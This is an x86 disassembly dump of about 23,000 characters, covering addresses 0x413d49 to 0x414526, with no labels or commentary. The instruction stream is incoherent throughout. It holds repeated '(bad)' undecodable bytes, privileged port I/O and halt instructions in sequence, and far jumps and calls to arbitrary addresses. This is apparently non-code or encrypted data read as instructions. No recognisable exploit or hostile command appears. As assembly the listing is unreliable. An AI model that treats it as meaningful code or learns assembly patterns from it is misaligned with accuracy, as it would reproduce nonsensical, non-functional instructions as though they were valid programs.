  413d49:	sbb    DWORD PTR [esp+eax*4+0xc],edi
  413d4d:	pop    edx
  413d4e:	loope  0x413d2b
  413d50:	js     0x413d37
  413d52:	enter  0x65ab,0x36
  413d56:	or     eax,0x89e89ee6
  413d5b:	out    0xc1,al
  413d5d:	fwait
  413d5e:	xor    BYTE PTR [ecx],cl
  413d60:	in     eax,dx
  413d61:	jmp    0x2abface8
  413d66:	push   ecx
  413d67:	jmp    0x413d75
  413d69:	inc    ebp
  413d6a:	xor    BYTE PTR ds:0x1b859e5c,cl
  413d70:	ins    DWORD PTR es:[edi],dx
  413d71:	lock pop esi
  413d73:	adc    al,0x71
  413d75:	ret    
  413d76:	xlat   BYTE PTR ds:[ebx]
  413d77:	cmp    edx,esi
  413d79:	in     eax,0x3
  413d7b:	jl     0x413d50
  413d7d:	push   ebp
  413d7e:	xor    eax,0xa67d1f68
  413d83:	jne    0x413dee
  413d85:	mov    ebp,0x7d86e93b
  413d8a:	gs dec esi
  413d8c:	test   eax,0x9102821
  413d91:	mov    edi,0x90356277
  413d96:	out    dx,eax
  413d97:	add    al,0x7a
  413d99:	or     cl,BYTE PTR [eax]
  413d9b:	sbb    eax,DWORD PTR [edi]
  413d9d:	cld    
  413d9e:	ret    
  413d9f:	mov    al,0x34
  413da1:	jle    0x413da5
  413da3:	sbb    al,0x7b
  413da5:	sbb    eax,0x83725c24
  413daa:	aad    0xa1
  413dac:	(bad)  
  413dad:	loop   0x413e21
  413daf:	fistp  DWORD PTR [esi-0x69]
  413db2:	(bad)  
  413db3:	dec    esi
  413db4:	retf   
  413db5:	fwait
  413db6:	adc    eax,0x16ce3454
  413dbb:	das    
  413dbc:	push   esi
  413dbd:	fidivr WORD PTR [eax]
  413dbf:	fs out 0x63,eax
  413dc2:	(bad)  
  413dc3:	pop    edi
  413dc4:	jl     0x413e2d
  413dc6:	mov    eax,0xf0aa461
  413dcb:	sub    DWORD PTR [esi+eax*8-0x79],edx
  413dcf:	mov    dl,0xec
  413dd1:	ret    
  413dd2:	or     ebx,DWORD PTR [esp+eax*4]
  413dd5:	les    edi,FWORD PTR [ebp-0x3]
  413dd8:	cmp    edx,DWORD PTR [esi-0x73f5beb]
  413dde:	sub    dl,cl
  413de0:	cmp    DWORD PTR [ebx+0x4c],ecx
  413de3:	and    BYTE PTR [edx-0x72],al
  413de6:	sbb    BYTE PTR [ebx],al
  413de8:	and    eax,0x86c7b7d5
  413ded:	pop    eax
  413dee:	inc    esi
  413def:	icebp  
  413df0:	jo     0x413e15
  413df2:	add    DWORD PTR [edi+0x43cd742e],eax
  413df8:	jmp    0x1331:0x5e712936
  413dff:	mov    esi,ds
  413e01:	sbb    ecx,DWORD PTR [ecx-0x581ebd14]
  413e07:	and    ebp,esi
  413e09:	lods   eax,DWORD PTR ds:[esi]
  413e0a:	mov    dl,0x9
  413e0c:	shl    DWORD PTR [edi],cl
  413e0e:	pushf  
  413e0f:	pop    es
  413e10:	jo     0x413e22
  413e12:	js     0x413dc5
  413e14:	(bad)  
  413e15:	cwde   
  413e16:	ja     0x413e41
  413e18:	sub    BYTE PTR [edx],ah
  413e1a:	daa    
  413e1b:	bound  edi,QWORD PTR [ebx+0x53ff4053]
  413e21:	mov    ds:0x50b930be,eax
  413e26:	pop    ebx
  413e27:	nop
  413e28:	or     DWORD PTR [ebp-0x3b0a668],eax
  413e2e:	cwde   
  413e2f:	xor    DWORD PTR [ecx-0x6bc56030],0xffffff82
  413e36:	inc    ebp
  413e37:	mov    edx,0x3b8be0a8
  413e3c:	lods   al,BYTE PTR cs:[esi]
  413e3e:	in     al,dx
  413e3f:	jge    0x413e5b
  413e41:	cmp    al,0xc1
  413e43:	push   edi
  413e44:	xchg   ecx,eax
  413e45:	or     al,0xd7
  413e47:	test   DWORD PTR [ebp+0x50],ebp
  413e4a:	in     eax,dx
  413e4b:	xor    eax,0xb8870d6b
  413e50:	stos   BYTE PTR es:[edi],al
  413e51:	pushf  
  413e52:	adc    esi,DWORD PTR [edx+0x49c299e8]
  413e58:	mov    esp,0xaf8c8dd9
  413e5d:	mov    edx,0x346aaeab
  413e62:	cmp    BYTE PTR [ecx-0x74656e97],ah
  413e68:	sub    al,0x5
  413e6a:	adc    al,0xf9
  413e6c:	test   eax,0xca9ca7c3
  413e71:	jge    0x413e8b
  413e73:	lock jne 0x413e53
  413e76:	jge    0x413e71
  413e78:	int    0x49
  413e7a:	xchg   edi,eax
  413e7b:	out    0xe9,al
  413e7d:	sub    al,0xfd
  413e7f:	xchg   ebp,edi
  413e81:	mov    edi,0x26e06169
  413e86:	jmp    0xea8c:0x8ca63eaa
  413e8d:	out    dx,eax
  413e8e:	push   0x59
  413e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e91:	pop    edi
  413e92:	fwait
  413e93:	ja     0x413e54
  413e95:	mov    edx,0xdf701d2e
  413e9a:	push   esi
  413e9b:	int3   
  413e9c:	call   0xc553289f
  413ea1:	or     BYTE PTR [ebx*1+0x4c9d9db1],dl
  413ea8:	jl     0x413e43
  413eaa:	pop    ebx
  413eab:	call   0xc812:0x1cfeb2c
  413eb2:	cld    
  413eb3:	cwde   
  413eb4:	int    0x4e
  413eb6:	loop   0x413f2b
  413eb8:	mov    DWORD PTR [edx-0x114cbc4f],esi
  413ebe:	sbb    al,0x51
  413ec0:	repz and BYTE PTR [ecx-0x1a],bh
  413ec4:	loop   0x413ed1
  413ec6:	cmp    eax,0x5cc8d81
  413ecb:	ss push ds
  413ecd:	(bad)  
  413ece:	push   esp
  413ecf:	sub    eax,0xc1eb553a
  413ed4:	out    0xf4,eax
  413ed6:	out    0xa7,eax
  413ed8:	mov    edx,0x1fef3053
  413edd:	push   edi
  413ede:	int3   
  413edf:	hlt    
  413ee0:	outs   dx,BYTE PTR ds:[esi]
  413ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee2:	xor    bl,BYTE PTR [eax-0x654d6735]
  413ee8:	jne    0x413ef2
  413eea:	iret   
  413eeb:	arpl   WORD PTR [esp+ebx*4-0x4c78cddd],cx
  413ef2:	into   
  413ef3:	daa    
  413ef4:	xchg   edx,eax
  413ef5:	cmp    dh,BYTE PTR [eax-0x36079d79]
  413efb:	push   ebx
  413efc:	inc    edx
  413efd:	and    DWORD PTR ds:0x67a63fdd,esp
  413f03:	pop    ss
  413f04:	adc    ah,BYTE PTR [edx]
  413f06:	mov    al,ds:0xcd1793d4
  413f0b:	sbb    DWORD PTR [ecx-0x688eb26a],ecx
  413f11:	pop    esp
  413f12:	outs   dx,BYTE PTR ds:[esi]
  413f13:	ds repz inc edi
  413f16:	ja     0x413f7b
  413f18:	jl     0x413f36
  413f1a:	add    BYTE PTR [edx-0x4ef7cfd1],cl
  413f20:	in     eax,0x9c
  413f22:	mov    cl,0x81
  413f24:	(bad)  
  413f25:	jns    0x413ee0
  413f27:	outs   dx,DWORD PTR ds:[esi]
  413f28:	add    eax,0xce524eb6
  413f2d:	neg    DWORD PTR [edi]
  413f2f:	dec    ebx
  413f30:	pop    es
  413f31:	ret    
  413f32:	push   esi
  413f33:	cli    
  413f34:	add    ecx,DWORD PTR [ebp+0x9]
  413f37:	inc    eax
  413f38:	mov    edi,0x8a2092b1
  413f3d:	fadd   DWORD PTR [ecx-0x2a]
  413f40:	and    eax,0x6be64c5b
  413f45:	inc    esi
  413f46:	mov    edi,0x5b805428
  413f4b:	sbb    cl,0x6c
  413f4e:	jmp    0x6cdb8fc5
  413f53:	enter  0x7fc,0xde
  413f57:	jle    0x413f82
  413f59:	xor    al,0x3c
  413f5b:	xchg   esp,eax
  413f5c:	or     ebx,ebx
  413f5e:	pop    ecx
  413f5f:	imul   eax,DWORD PTR [edx-0x247765d3],0x18
  413f66:	jb     0x413f9d
  413f68:	div    dl
  413f6a:	mov    eax,ds:0x790fa585
  413f6f:	add    al,0xf1
  413f71:	push   esi
  413f72:	aam    0xf0
  413f74:	mov    eax,0xc00b3be5
  413f79:	sub    esp,DWORD PTR [ecx+0x6430df94]
  413f7f:	xor    BYTE PTR [esi+0x4d],dh
  413f82:	jne    0x413fc6
  413f84:	mov    BYTE PTR [ecx],ch
  413f86:	sub    BYTE PTR [ebx+0x656cbe4e],0x5
  413f8d:	jns    0x413f30
  413f8f:	bound  edx,QWORD PTR [eax-0x21902afb]
  413f95:	cwde   
  413f96:	mov    edi,0x4873f6c1
  413f9b:	(bad)  
  413f9c:	pop    ebx
  413f9d:	mov    al,ds:0xb2a1e629
  413fa2:	sbb    dl,BYTE PTR [ebx-0x30a0c382]
  413fa8:	mov    ds:0x97a24713,al
  413fad:	in     eax,0x9c
  413faf:	pop    ecx
  413fb0:	lds    ebx,FWORD PTR ds:0xfa696c26
  413fb6:	inc    esi
  413fb7:	sbb    DWORD PTR [eax],esp
  413fb9:	xor    BYTE PTR [eax-0x61937a12],dl
  413fbf:	daa    
  413fc0:	mov    esi,0x44241845
  413fc5:	push   ss
  413fc6:	xor    edi,ebp
  413fc8:	retf   
  413fc9:	repz iret 
  413fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fcc:	mov    dl,0x24
  413fce:	lods   al,BYTE PTR ds:[esi]
  413fcf:	and    DWORD PTR [ecx+0x2ef6e76f],edi
  413fd5:	cwde   
  413fd6:	shl    BYTE PTR [eax],1
  413fd8:	pop    edi
  413fd9:	xor    esp,ecx
  413fdb:	clc    
  413fdc:	dec    edx
  413fdd:	jg     0x413f6d
  413fdf:	mov    BYTE PTR [edi],dl
  413fe1:	cwde   
  413fe2:	adc    esp,ebp
  413fe4:	lods   eax,DWORD PTR ds:[esi]
  413fe5:	dec    esp
  413fe6:	(bad)  
  413fe7:	scas   al,BYTE PTR es:[edi]
  413fe8:	and    al,0xde
  413fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413feb:	call   0xa91ec2b4
  413ff0:	pop    esi
  413ff1:	mov    eax,0xcddbad79
  413ff6:	pop    esi
  413ff7:	mov    ah,0x69
  413ff9:	xchg   esp,eax
  413ffa:	cs pop ds
  413ffc:	sub    eax,0xd0ebfcd8
  414001:	add    DWORD PTR [ebx-0x1f819def],0x1295de77
  41400b:	jmp    0x70592183
  414010:	or     esi,DWORD PTR [ecx]
  414012:	cli    
  414013:	pop    edi
  414014:	xchg   edi,eax
  414015:	imul   eax,DWORD PTR [edx],0x27
  414018:	jg     0x414037
  41401a:	shl    DWORD PTR [edi],0x5c
  41401d:	daa    
  41401e:	inc    ecx
  41401f:	cwde   
  414020:	cmp    ch,BYTE PTR [esi+0x17]
  414023:	sbb    DWORD PTR [eax+ebx*1],ecx
  414026:	mov    edx,0xde201e35
  41402b:	sbb    ah,BYTE PTR [edi+0x6]
  41402e:	popa   
  41402f:	add    eax,0x2a1dbec5
  414034:	stos   DWORD PTR es:[edi],eax
  414035:	adc    ecx,eax
  414037:	mov    BYTE PTR ss:[ebx],ch
  41403a:	mov    al,ds:0x9fc675bc
  41403f:	and    eax,ecx
  414041:	mov    ch,0x7e
  414043:	(bad)  
  414044:	out    0x72,eax
  414046:	jb     0x4140a3
  414048:	fistp  QWORD PTR [esi-0x2d]
  41404b:	fisubr DWORD PTR [eax-0x5e9332fc]
  414051:	lahf   
  414052:	cmp    BYTE PTR [eax+0x50],al
  414055:	and    edi,DWORD PTR [edx-0x2d]
  414058:	adc    DWORD PTR [ebx],0x85b61489
  41405e:	ja     0x41409d
  414060:	xchg   edx,eax
  414061:	mov    cl,0x95
  414063:	and    bl,ch
  414065:	push   esi
  414066:	daa    
  414067:	sub    BYTE PTR [eax+0x2cb711f9],bl
  41406d:	mov    ecx,0x118ffcd4
  414072:	jae    0x4140d9
  414074:	or     al,0x93
  414076:	sbb    DWORD PTR [edi],ecx
  414078:	mov    BYTE PTR [eax],ah
  41407a:	fiadd  WORD PTR [ebx+0x3e9ecc5a]
  414080:	jecxz  0x414005
  414082:	shl    DWORD PTR [esi-0x7d726a96],0xcc
  414089:	les    edx,FWORD PTR [edx-0x64]
  41408c:	(bad)  
  41408d:	mov    ebp,0x199ed0c1
  414092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414093:	xor    eax,0xbaa96f16
  414098:	inc    ebp
  414099:	jecxz  0x4140d9
  41409b:	pop    ss
  41409c:	(bad)  
  41409d:	stos   DWORD PTR es:[edi],eax
  41409e:	cmp    cl,BYTE PTR [eax]
  4140a0:	std    
  4140a1:	mov    esi,0xca01f1f2
  4140a6:	loopne 0x4140ba
  4140a8:	enter  0x47ed,0xe9
  4140ac:	nop    DWORD PTR [ecx+0x5fdb8656]
  4140b3:	test   DWORD PTR ds:[ebx],ebp
  4140b6:	popa   
  4140b7:	enter  0x55cc,0x3c
  4140bb:	dec    ebx
  4140bc:	fst    QWORD PTR [ecx+0x6d20bd66]
  4140c2:	or     eax,0x1d0918
  4140c7:	xor    al,0xb5
  4140c9:	dec    edx
  4140ca:	jnp    0x4140d6
  4140cc:	jo     0x414120
  4140ce:	sbb    DWORD PTR [edi+0x19147889],0xffffffef
  4140d5:	sub    ebx,DWORD PTR [ecx+0x456f2049]
  4140db:	inc    esp
  4140dc:	cmp    DWORD PTR [ebx+0x50f7882e],esi
  4140e2:	and    al,0x99
  4140e4:	jmp    0x4140fd
  4140e6:	pop    ds
  4140e7:	and    ebp,DWORD PTR [edx-0x35a42f95]
  4140ed:	xchg   edi,eax
  4140ee:	mov    dl,0xcc
  4140f0:	aas    
  4140f1:	jns    0x41407d
  4140f3:	jmp    0xbde2:0xea4d2d25
  4140fa:	mov    bh,0xc8
  4140fc:	cmp    ah,0x6c
  4140ff:	in     eax,0x49
  414101:	fwait
  414102:	push   ebx
  414103:	mov    esp,0xbfeb444a
  414108:	xor    BYTE PTR [ebx+0x5c73d31b],0x17
  41410f:	mov    ds:0x9e91bded,eax
  414114:	or     al,BYTE PTR [edx]
  414116:	sbb    ah,BYTE PTR [ebp-0x3fae1072]
  41411c:	jl     0x4140dc
  41411e:	je     0x414138
  414120:	push   edi
  414121:	mov    WORD PTR [eax+0x16],ss
  414124:	repz (bad) 
  414126:	xchg   ecx,eax
  414127:	aaa    
  414128:	mov    cl,0xdf
  41412a:	int    0x66
  41412c:	sub    eax,0xe3715515
  414131:	pop    edi
  414132:	loop   0x414184
  414134:	xor    eax,0x7d4c0821
  414139:	in     al,dx
  41413a:	neg    BYTE PTR [edi+0x4e]
  41413d:	jo     0x414195
  41413f:	jns    0x4141ad
  414141:	aad    0x87
  414143:	jmp    0x2f45:0xacb7aea4
  41414a:	out    0x37,eax
  41414c:	out    0xb7,al
  41414e:	mov    ch,0x5b
  414150:	jmp    0x680bc8ea
  414155:	test   al,0x79
  414157:	lods   eax,DWORD PTR ds:[esi]
  414158:	ja     0x41418b
  41415a:	(bad)  
  41415b:	sub    BYTE PTR ds:0x6a9ff09,bh
  414161:	(bad)  
  414162:	xchg   edi,eax
  414163:	pop    ds
  414164:	push   ecx
  414165:	mov    esp,0xe808fd1a
  41416a:	arpl   WORD PTR [edi-0x4d],dx
  41416d:	inc    ebp
  41416e:	jns    0x4141d5
  414170:	inc    ebx
  414171:	xchg   BYTE PTR [ebx],dl
  414173:	add    eax,0xa76b41a2
  414178:	rcr    DWORD PTR [eax+0x10],0xa8
  41417c:	dec    esp
  41417d:	push   edi
  41417e:	pop    ds
  41417f:	dec    ebx
  414180:	dec    ecx
  414181:	lea    ebx,[esi+esi*2-0x6351234e]
  414188:	sbb    DWORD PTR [ebx+0x3a],edi
  41418b:	dec    ebp
  41418c:	imul   esp,DWORD PTR [ebx-0x6],0xbd8b853a
  414193:	dec    ebp
  414194:	out    dx,al
  414195:	cmp    edx,DWORD PTR [ecx-0x669f17aa]
  41419b:	push   ds
  41419c:	adc    DWORD PTR [esi],0xbd27fa24
  4141a2:	sti    
  4141a3:	xchg   DWORD PTR [edx-0x718a3f1d],esi
  4141a9:	jg     0x41421c
  4141ab:	cld    
  4141ac:	rol    DWORD PTR [ecx+0x62506529],0x3c
  4141b3:	push   cs
  4141b4:	fdivr  DWORD PTR [edi]
  4141b6:	jp     0x414140
  4141b8:	cmc    
  4141b9:	popf   
  4141ba:	jbe    0x414230
  4141bc:	mov    ?,WORD PTR [ebx+0x37a18f84]
  4141c2:	jne    0x4141cb
  4141c4:	fst    st(3)
  4141c6:	out    0x72,al
  4141c8:	cli    
  4141c9:	pop    ecx
  4141ca:	dec    edx
  4141cb:	mov    ch,0xa2
  4141cd:	pusha  
  4141ce:	(bad)  
  4141cf:	outs   dx,DWORD PTR ds:[esi]
  4141d0:	mov    ch,0x36
  4141d2:	(bad)  
  4141d3:	daa    
  4141d4:	call   0xd85b:0x6455f836
  4141db:	pusha  
  4141dc:	int    0x5c
  4141de:	add    eax,0x87d86065
  4141e3:	add    DWORD PTR [edi+edx*4],ebp
  4141e6:	retf   0x83c3
  4141e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ea:	push   edi
  4141eb:	dec    eax
  4141ec:	pop    esi
  4141ed:	mov    esp,0xdc5d9ca5
  4141f2:	aaa    
  4141f3:	loopne 0x414274
  4141f5:	cmp    DWORD PTR [ecx+ebp*1],edx
  4141f8:	mov    bh,0x44
  4141fa:	xor    DWORD PTR [eax],0xb4c6ca5c
  414200:	mov    esp,0xd9fa9fa6
  414205:	dec    esp
  414206:	sbb    dl,0x55
  414209:	xlat   BYTE PTR ds:[ebx]
  41420a:	int    0x15
  41420c:	sub    ah,ah
  41420e:	aad    0xf4
  414210:	ret    
  414211:	pop    es
  414212:	scas   al,BYTE PTR es:[edi]
  414213:	loope  0x41423c
  414215:	in     eax,dx
  414216:	push   cs
  414217:	fdiv   st(3),st
  414219:	push   0x92a457c3
  41421e:	(bad)  
  41421f:	sbb    ebx,ebp
  414221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414222:	mov    ds:0x21531ead,eax
  414227:	lahf   
  414228:	mov    bh,0x86
  41422a:	(bad)  
  41422c:	(bad)  
  41422d:	inc    ebx
  41422e:	push   es
  41422f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414230:	or     BYTE PTR [edi+0xd16575c],ch
  414236:	mov    ah,0xdf
  414238:	fdivr  st(0),st
  41423a:	call   0xad52f9d8
  41423f:	ror    DWORD PTR [ebx+0x54],cl
  414242:	lds    edi,FWORD PTR [eax+0x23]
  414245:	cmp    edi,edi
  414247:	inc    edx
  414248:	jle    0x4141db
  41424a:	push   ebx
  41424b:	loop   0x41427f
  41424d:	push   esp
  41424e:	(bad)  
  41424f:	jmp    0x4141d6
  414251:	pop    esp
  414252:	cmp    BYTE PTR [esi],cl
  414254:	dec    ebx
  414255:	(bad)  
  414256:	rcl    BYTE PTR [ebx+0x60],cl
  414259:	add    BYTE PTR [edx+0x15],dl
  41425c:	mov    dh,0xb2
  41425e:	pop    esp
  41425f:	in     eax,dx
  414260:	mov    dl,0x2a
  414262:	sub    BYTE PTR [ebx-0x47fd5ea1],0x16
  414269:	jne    0x414253
  41426b:	sar    cl,cl
  41426d:	xchg   bl,ah
  41426f:	inc    eax
  414270:	jbe    0x414257
  414272:	mov    dl,BYTE PTR [ebx+0x12]
  414275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414276:	hlt    
  414277:	inc    edi
  414278:	shl    BYTE PTR ds:0x6b015255,0xb9
  41427f:	imul   ecx,DWORD PTR [esi+0x35d5b002],0xdfa3582b
  414289:	cmp    BYTE PTR [edx],0xcd
  41428c:	pop    edx
  41428d:	ss xchg edi,esp
  414290:	jmp    0xef3627e3
  414295:	(bad)  
  414297:	out    dx,al
  414298:	ins    DWORD PTR es:[edi],dx
  414299:	cdq    
  41429a:	js     0x4142b6
  41429c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41429d:	sub    BYTE PTR ds:0xd9f0edcc,dh
  4142a3:	mov    esi,0x3c469c3e
  4142a8:	add    ecx,ecx
  4142aa:	cwde   
  4142ab:	lods   eax,DWORD PTR ds:[esi]
  4142ac:	dec    ebp
  4142ad:	sub    ecx,DWORD PTR [ebx+0x67]
  4142b0:	jb     0x4142f8
  4142b2:	jbe    0x414314
  4142b4:	imul   esp,DWORD PTR [eiz*4-0x154708e7],0xffffffed
  4142bc:	lds    ebp,FWORD PTR [ebx+0x40]
  4142bf:	xor    ah,dh
  4142c1:	pop    ebx
  4142c2:	adc    BYTE PTR [ebx+0x20],0x4a
  4142c6:	inc    eax
  4142c7:	pop    esi
  4142c8:	stc    
  4142c9:	int    0x9d
  4142cb:	sar    DWORD PTR [edx-0x1],cl
  4142ce:	or     eax,0x5f2bfaf4
  4142d3:	and    ecx,DWORD PTR [esi-0x74e3521c]
  4142d9:	lods   al,BYTE PTR ds:[esi]
  4142da:	jbe    0x4142aa
  4142dc:	cmp    esi,ebx
  4142de:	adc    al,0xfa
  4142e0:	hlt    
  4142e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e2:	xchg   edi,eax
  4142e3:	fnsetpm(287 only) 
  4142e5:	mov    ds:0xe139993b,eax
  4142ea:	aam    0x18
  4142ec:	sub    eax,0x6d6262aa
  4142f1:	push   cs
  4142f2:	cmp    al,0x40
  4142f4:	lods   al,BYTE PTR ds:[esi]
  4142f5:	jae    0x4142b9
  4142f7:	push   ss
  4142f8:	sub    DWORD PTR [eax],eax
  4142fa:	adc    DWORD PTR [edi],ecx
  4142fc:	stos   BYTE PTR es:[edi],al
  4142fd:	stos   DWORD PTR es:[edi],eax
  4142fe:	test   DWORD PTR [edx],ebp
  414300:	xor    DWORD PTR [eax+0x40d6ee2b],0xffffffeb
  414307:	cmp    dh,BYTE PTR ss:[eax+0x30]
  41430b:	lock push cs
  41430d:	jo     0x4142a8
  41430f:	jae    0x4142b3
  414311:	push   es
  414312:	mov    DWORD PTR [ecx+0x5c],ebx
  414315:	ss ja  0x4142c1
  414318:	aas    
  414319:	mov    ds:0x61645b68,al
  41431e:	pop    edx
  41431f:	mov    ecx,DWORD PTR [edx+0x16]
  414322:	in     al,0x9
  414324:	lods   eax,DWORD PTR ds:[esi]
  414325:	sbb    esi,DWORD PTR [ebp+0x8356884]
  41432b:	cdq    
  41432c:	mov    al,ds:0x8472366c
  414331:	jmp    0x414353
  414333:	dec    esp
  414334:	mov    ds,WORD PTR [ebx]
  414336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414337:	sbb    dl,dh
  414339:	mov    es:0x4e4824b2,al
  41433f:	push   eax
  414340:	ins    BYTE PTR es:[edi],dx
  414341:	loop   0x414399
  414343:	retf   
  414344:	fimul  DWORD PTR [edx+0x57ac056c]
  41434a:	ja     0x414349
  41434c:	sub    BYTE PTR [eax],al
  41434e:	pop    esi
  41434f:	in     eax,dx
  414350:	loope  0x4143c4
  414352:	lods   al,BYTE PTR ds:[esi]
  414353:	push   edx
  414354:	and    eax,0x2deb7f30
  414359:	xchg   ebx,eax
  41435a:	mov    bl,0x33
  41435c:	les    esp,FWORD PTR [ecx+0x262998e6]
  414362:	ror    BYTE PTR [esi-0x52ba7d0e],0xe0
  414369:	ins    DWORD PTR es:[edi],dx
  41436a:	jg     0x41438a
  41436c:	cmp    BYTE PTR [edx-0x2d19ed07],ah
  414372:	or     BYTE PTR [ebx-0x18689675],ah
  414378:	cmc    
  414379:	sub    bh,cl
  41437b:	mov    ds:0x105f30a0,eax
  414380:	test   al,0x88
  414382:	test   DWORD PTR [esi-0x73],ebx
  414385:	inc    edx
  414386:	cmp    eax,0x24a7a382
  41438b:	clc    
  41438c:	cmp    ebp,DWORD PTR [ecx-0x7ccae6f2]
  414392:	nop
  414393:	inc    ebx
  414394:	jg     0x41436d
  414396:	ins    BYTE PTR es:[edi],dx
  414397:	and    dl,dh
  414399:	ret    
  41439a:	and    ebx,DWORD PTR [ebp+0x24]
  41439d:	ins    DWORD PTR es:[edi],dx
  41439e:	or     ah,dh
  4143a0:	xlat   BYTE PTR ds:[ebx]
  4143a1:	push   edi
  4143a2:	dec    esp
  4143a3:	jae    0x4143a7
  4143a5:	and    al,0x82
  4143a7:	enter  0xf78,0x5b
  4143ab:	fmul   DWORD PTR [eax-0x47fe490a]
  4143b1:	sbb    eax,0xe30ed6a2
  4143b6:	(bad)  
  4143b7:	xlat   BYTE PTR ds:[ebx]
  4143b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b9:	or     esi,ebp
  4143bb:	mov    dl,0xd4
  4143bd:	fmulp  st(0),st
  4143bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c0:	adc    dl,dh
  4143c2:	mov    ah,0xc5
  4143c4:	mov    ds:0x67e30328,al
  4143c9:	ror    BYTE PTR [edi+0x6ca70d17],0x12
  4143d0:	xor    edx,DWORD PTR [edx+eiz*8-0x3b]
  4143d4:	rol    DWORD PTR [ebp-0x500cfeab],1
  4143da:	dec    edi
  4143db:	jge    0x4143cb
  4143dd:	mov    dh,0xde
  4143df:	xchg   edx,eax
  4143e0:	outs   dx,BYTE PTR ds:[esi]
  4143e1:	push   esp
  4143e2:	cs retf 0x57b7
  4143e6:	inc    ecx
  4143e7:	jbe    0x41443c
  4143e9:	pop    ebx
  4143ea:	cmp    BYTE PTR [esi-0x49],dh
  4143ed:	add    DWORD PTR [edi],esi
  4143ef:	xchg   ebx,eax
  4143f0:	jo     0x41440a
  4143f2:	lock repz and eax,0xcd6f98d7
  4143f9:	lods   eax,DWORD PTR ds:[esi]
  4143fa:	pusha  
  4143fb:	sub    ebp,esi
  4143fd:	push   esi
  4143fe:	mov    dl,0xd4
  414400:	jns    0x414411
  414402:	int3   
  414403:	fsubp  st(0),st
  414405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414406:	call   0xd7b:0xbad186f1
  41440d:	in     al,0x6d
  41440f:	daa    
  414410:	dec    esp
  414411:	xor    BYTE PTR [esi],ch
  414413:	iret   
  414414:	fwait
  414415:	cwde   
  414416:	ja     0x41447e
  414418:	stos   BYTE PTR es:[edi],al
  414419:	mov    esi,0xcbbb54e
  41441e:	fs retf 
  414420:	lods   al,BYTE PTR ds:[esi]
  414421:	cdq    
  414422:	jge    0x41449e
  414424:	push   edi
  414425:	jecxz  0x4143fe
  414427:	cmp    edi,edi
  414429:	fstp   DWORD PTR [ebp+0x737bca19]
  41442f:	sar    edi,1
  414431:	int    0x5f
  414433:	iret   
  414434:	ins    DWORD PTR es:[edi],dx
  414435:	mov    eax,ds:0xca1326c3
  41443a:	addr16 xchg esi,eax
  41443c:	outs   dx,DWORD PTR ds:[esi]
  41443d:	push   ebx
  41443e:	adc    al,0x70
  414441:	xchg   edx,edx
  414443:	fdivrp st(6),st
  414445:	cmp    edx,esi
  414447:	cmp    al,0x7e
  414449:	stc    
  41444a:	arpl   WORD PTR [ebp+0x62433305],ax
  414450:	aam    0xb5
  414452:	xor    ecx,ebx
  414454:	push   ebx
  414455:	mov    dh,0x1e
  414457:	repnz pushf 
  414459:	add    al,0xf
  41445b:	push   0x879f4669
  414460:	xchg   ebx,eax
  414461:	pop    ebx
  414462:	sub    dh,BYTE PTR cs:[esi-0x59baa3fa]
  414469:	retf   0xc16e
  41446c:	jl     0x414466
  41446e:	jae    0x414445
  414470:	call   0xab8e:0x5d4c5f92
  414477:	ror    esi,1
  414479:	jno    0x414452
  41447b:	arpl   WORD PTR [edx],bx
  41447d:	inc    edx
  41447e:	and    eax,0x99e5d869
  414483:	shl    DWORD PTR [ebx+ebx*8-0x32],0xb1
  414488:	push   edx
  414489:	out    dx,eax
  41448a:	enter  0xca9e,0xe8
  41448e:	je     0x41447a
  414490:	popf   
  414491:	cmp    DWORD PTR [ebp-0x71cb2861],esi
  414497:	test   al,0x60
  414499:	clc    
  41449a:	lods   eax,DWORD PTR ds:[esi]
  41449b:	lock or DWORD PTR [edx+0x55595c51],ebx
  4144a2:	fwait
  4144a3:	ins    DWORD PTR es:[edi],dx
  4144a4:	je     0x414457
  4144a6:	test   DWORD PTR es:[ebx+0x50495d53],esp
  4144ad:	dec    edx
  4144ae:	jle    0x414467
  4144b0:	pop    esp
  4144b1:	es xor esi,ecx
  4144b4:	ror    esi,0xba
  4144b7:	xor    ch,BYTE PTR [edi-0x109591ba]
  4144bd:	and    BYTE PTR [ebx],cl
  4144bf:	sub    edx,edi
  4144c1:	fistp  WORD PTR [ebx-0x2]
  4144c4:	ss pop ss
  4144c6:	dec    esp
  4144c7:	sahf   
  4144c8:	dec    ecx
  4144c9:	aad    0xe9
  4144cb:	push   ecx
  4144cc:	inc    ebx
  4144cd:	inc    edi
  4144ce:	je     0x414509
  4144d0:	dec    edi
  4144d1:	push   ebx
  4144d2:	ret    
  4144d3:	adc    DWORD PTR [ecx+0x5e9ff5a5],edi
  4144d9:	fdivr  QWORD PTR [edi+0x306dfd84]
  4144df:	and    BYTE PTR [edi+0x5cbacf64],dh
  4144e5:	in     eax,dx
  4144e6:	call   0x34e7a3fb
  4144eb:	lea    edx,[edi+0x5a]
  4144ee:	clc    
  4144ef:	push   ebx
  4144f0:	mov    edx,0xc9fefdaf
  4144f5:	mov    ebx,0x1b77c8d1
  4144fa:	or     eax,0x4670174c
  4144ff:	dec    eax
  414500:	xchg   edi,eax
  414501:	and    DWORD PTR [edi+0x779e58b6],edi
  414507:	mov    al,0x29
  414509:	gs ret 0x86f6
  41450d:	sbb    ebp,DWORD PTR [ecx+eax*4+0x209d2fbe]
  414514:	pop    ecx
  414515:	lahf   
  414516:	test   DWORD PTR [ebp-0x69],ebp
  414519:	jno    0x4144f7
  41451b:	add    DWORD PTR [ecx],ebx
  41451d:	enter  0xfc6c,0x19
  414521:	es retf 0x6749
  414525:	pop    edx
  414526:	outs   dx,DWORD PTR ds:[esi]
